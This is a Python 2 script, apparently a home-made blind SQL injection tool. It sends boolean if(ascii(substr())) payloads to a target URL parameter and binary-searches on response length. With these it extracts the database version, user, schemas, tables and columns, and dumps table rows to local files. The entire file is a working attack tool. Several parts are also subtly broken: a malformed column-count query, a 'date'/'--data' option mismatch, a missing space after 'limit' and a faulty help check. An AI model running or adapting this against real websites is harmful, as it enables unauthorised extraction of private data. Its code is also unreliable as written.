#! /usr/bin/env python
import getopt
import sys
import httplib
import string
import os
import time

url_s = ''
url_m = ''

def is_dir():
    global url_m
    if os.path.isdir(url_m) == False:
        os.mkdir(url_m)

def save_log(theInfo):
    global url_m
    is_dir()
    if os.getcwd().find(':') == 1:
        fp_log = open(os.getcwd() + "\\" + url_m + "\\" + "log.txt",'a+')
    else:
        fp_log = open(os.getcwd() + "/" + url_m + "/" + "log.txt",'a+')
    theTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    fp_log.write(theTime + ': ' +theInfo)

    fp_log.close()

def save_dump(database, table, column, result):
    global url_m
    is_dir()
    if os.getcwd().find(':') == 1:
        fp_dump = open(os.getcwd() + "\\" + url_m + "\\" + "dump.txt",'a+')
    else:
        fp_dump = open(os.getcwd() + "/" + url_m + "/"  + "dump.txt",'a+')
    theTime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
    fp_dump.write(theTime + ': \n' + database + table + column + '\n' )
    for i in result:
        temp_dump = str(i)
        fp_dump.writelines(temp_dump + '\n')

    fp_dump.close()

def urlsqli(theInfo):
    global url_s
    global url_m
    length_r = 0
    result = ""
    url_m = url_s[:url_s.find('/')]
    # print url_m:xxx.xxx.xxx
    url_d = url_s[url_s.find('/'):url_s.find('=')+1] + 'if(ascii(substr((' + theInfo + '),' #6,1))=53,1,0)
    # print url_d :/xxx.xx?xx=
    url_id = url_s[url_s.find('=')+1:]
    conn = httplib.HTTPConnection(url_m)
    conn.request('GET',url_s[url_s.find('/'):])
    response = conn.getresponse()
    length_r = len(response.read()) - 50
    print length_r

    i = 0
    for i in range(1,50):
        theMax = 126
        theMin = 0
        flag1 = 0
        while True:
            mid = (theMin + theMax) / 2
            # print mid, theMin, theMax
            conn = httplib.HTTPConnection(url_m)
            url = url_d + str(i) + ',1))>' + str(mid) + ',' + url_id + ',-1)'        
            print url
            conn.request('GET',url)
            response = conn.getresponse()
            length = len(response.read())
            print length

            if length >= length_r:
                if mid == theMax:
                    result = result + chr(mid+1)
                    print result
                    flag1 = 1
                    break
                theMin = mid + 1
            elif length < length_r:
                theMax = mid - 1
                if theMin == mid:
                    if mid ==0:
                        flag1 = 0
                        break
                    result = result + chr(mid)
                    print result
                    flag1 = 1
                    break  
        if flag1 == 0:
            break
    return result

def dump(database, table):
    num_colu,re_colu = columns(database, table)
    num_date = int(urlsqli('select count(*) from ' + database + '.' + table)) + 1
    result = [['' for col in range(num_colu)] for row in range (num_date)]
    result[0] = re_colu[:]
    for i in range(num_colu):
        temp_t,temp_data = data(database, table, re_colu[i])
        for j in range(1,num_date):
            result[j][i] = temp_data[j]
    save_dump(database, table, "", result)

def data(database, table, column):
    n = int(urlsqli('select count(*) from ' + database + '.' + table))
    result=['null']*n
    if n != 0: 
        for j in range(n):
            theInfo = 'select `' + column + '` from ' + database + '.' + table + ' limit' + str(j) + ',1'
            save_log(theInfo)

            flag2 = urlsqli(theInfo)
            result[j] = flag2
    for i in result:
        print i
    save_dump(database, table, column, result)
    return n, result

def columns(database, table):
    #global temp_colu
    print 'Columns of ' + database + '.' + table + ':'
    n = int(urlsqli('select count(*) from information_schema.schemata="'+table+'"'))
    result=['null']*n
    if n != 0: 
        for j in range(n):
            #select column_name from information_schema.columns where table_name = 'admin' limit 0,1
            theInfo = 'select column_name from information_schema.columns where table_name=0x' + str(table.encode("hex")) + ' limit ' + str(j) + ',1'
            save_log(theInfo)

            flag2 = urlsqli(theInfo)
            print flag2
            result[j] = flag2
        
    for i in result:
        print i
    save_dump(database, table, "", result)
    return n, result

def tables(database):
    
    print 'Tables of ' + database + ':'
    n = int(urlsqli('select count(*) from information_schema.tables where table_schema="'+database+'"'))
    result=['null']*n
    if n != 0: 
        for j in range(n):
            print '     ' 
            theInfo = 'select table_name from information_schema.tables where table_schema=0x' + str(database.encode("hex")) + ' limit ' + str(j) + ',1'
            save_log(theInfo)
            flag2 = urlsqli(theInfo)
            print flag2
            result[j] = flag2     
    for i in result:
        print i
    save_dump(database, "", "", result)
    return n, result

def dbs():
    
    print 'Databases:'
    n = int(urlsqli('select count(*) from information_schema.schemata'))
    result=['null']*n
    if n != 0: 
        for j in range(n):
            print '     '
            #select 1,2,schema_name,4 from information_schema.schemata limit N,1
            theInfo = 'select schema_name from information_schema.schemata limit ' + str(j) + ',1'
            save_log(theInfo)

            flag2 = urlsqli(theInfo)
            print flag2
            result[j] = flag2
        
    for i in result:
        print i
    save_dump("", "", "", result)
    return n, result

def version():
    theInfo = 'version()'
    version = urlsqli(theInfo)
    print 'Version :' + version

def user():
    theInfo = 'user()'
    print 'User:'
    urlsqli(theInfo)

def currentDB():
    theInfo = 'database()'
    print 'Database:'
    urlsqli(theInfo)

# def dataDir(): 
#     theInfo = '@@datadir'
#     print 'Datadir :'
#     urlsqli(theInfo)

# def os():   
#     theInfo = '@@version_compile_os'
#     print 'OS :'
#     urlsqli(theInfo)

def usage():
    #The help words
    print "Usage: python blindsqli_if [options]\n"
    print "Options:"
    print(
        '   -h, --help        Show basic help message and exit\n'
        '   -u URL            Target URL (e.g. "www.target.com/vuln.php?id=1")\n'
        '   --version         The version of target\'s DB\n'
        '   --currentuser     The current user of target\'s DB\n'
        '   --currentdb       The current user of target URL\n'
        '   --dbs             Enumerate DBMS database\n'
        '   --tables          Enumerate DBMS database tables\n'
        '   --columns         Enumerate DBMS database table columns\n'
        '   --data            Dump DBMS database table entries\n'
        '   --dump            Dump DBMS database table entries for one specific table\n'
        '   -D DB             DBMS database to enumerate\n'
        '   -T TBL            DBMS database table to enumerate\n'
        '   -C COL            DBMS database table column to enumerate\n'
        '\n   e.g. blindsqli_if -u www.target.com/vuln.php?id=1 --version'
        )

def option():
    global url_s

    temp = "usage"
    database = ""
    table = ""
    column = ""

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hu:D:T:C:", ["help", "version", "currentuser", "currentdb", "dbs", "tables", "columns", "date", "dump"])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o, a in opts:
        if o == ("-h", "--help"):
            usage()
            sys.exit()
        elif o == "-u" :
            url_s = a
        elif o == "-D":
            database = a
        elif o == "-T":
            table = a
        elif o == "-C":
            column = a
        elif o == "--version":
            temp = "version"
        elif o == "--currentuser":
            temp = "currentuser"
        elif o == "--currentdb":
            temp = "currentdb"
        elif o == "--dbs":
            temp = "dbs"
        elif o == "--tables":
            temp = "tables"
        elif o == "--columns":
            temp = "columns"
        elif o == "--data":
            temp = "data"
        elif o == "--dump":
            temp = "dump"

    doit = {
        'usage': lambda: usage(),
        'version': lambda: version(),
        'currentuser': lambda: user(),
        'currentdb': lambda: currentDB(),
        'dbs': lambda: dbs(),
        'tables': lambda: tables(database),
        'columns': lambda: columns(database, table),
        'data': lambda: data(database, table, column),
        'dump': lambda: dump(database, table)
    }[temp]()

if __name__ == '__main__':
    option()
